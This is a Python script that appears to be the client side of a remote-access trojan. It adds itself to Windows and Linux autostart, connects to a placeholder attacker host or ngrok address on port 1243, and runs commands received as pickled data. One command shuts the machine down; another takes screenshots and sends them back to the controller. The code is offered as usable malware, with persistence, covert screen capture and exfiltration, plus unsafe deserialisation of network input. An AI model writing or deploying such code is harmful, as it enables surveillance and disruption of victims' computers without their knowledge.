import socket
import pickle
import os
import shutil
import pyautogui
import io

HEADERSIZE = 10
screenshot_active = False

def add_to_autostart():
    script_path = os.path.abspath(__file__)
    if os.name == 'nt':  # Windows
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shutil.copy(script_path, startup_dir)
    elif os.name == 'posix':  # Linux
        autostart_dir = os.path.expanduser('~/.config/autostart')
        if not os.path.exists(autostart_dir):
            os.makedirs(autostart_dir)
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name[en_US]=MyScript
Name=MyScript
Comment[en_US]=Start MyScript at login
Comment=Start MyScript at login
"""
        with open(os.path.join(autostart_dir, 'myscript.desktop'), 'w') as f:
            f.write(desktop_entry)

add_to_autostart()
print("Added to autostart")

# Replace with the public IP address or ngrok URL of the host machine
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('your_public_ip_or_ngrok_url', 1243))

while True:
    full_msg = b''
    new_msg = True
    while True:
        msg = s.recv(16)
        if new_msg:
            msglen = int(msg[:HEADERSIZE])
            new_msg = False

        full_msg += msg

        if len(full_msg) - HEADERSIZE == msglen:
            command = pickle.loads(full_msg[HEADERSIZE:])
            if command == "123":
                if os.name == 'nt':  # Windows
                    os.system("shutdown /s /t 1")
                elif os.name == 'posix':  # Linux
                    os.system("shutdown now")
            elif command == "223":
                screenshot_active = not screenshot_active
                screenshot_count = 0
                while screenshot_active and screenshot_count < 10:
                    screenshot = pyautogui.screenshot()
                    img_byte_arr = io.BytesIO()
                    screenshot.save(img_byte_arr, format='PNG')
                    img_byte_arr = img_byte_arr.getvalue()
                    img_msg = pickle.dumps(img_byte_arr)
                    img_msg = bytes(f"{len(img_msg):<{HEADERSIZE}}", 'utf-8') + img_msg
                    s.send(img_msg)
                    screenshot_count += 1
                screenshot_active = False
            new_msg = True
            full_msg = b""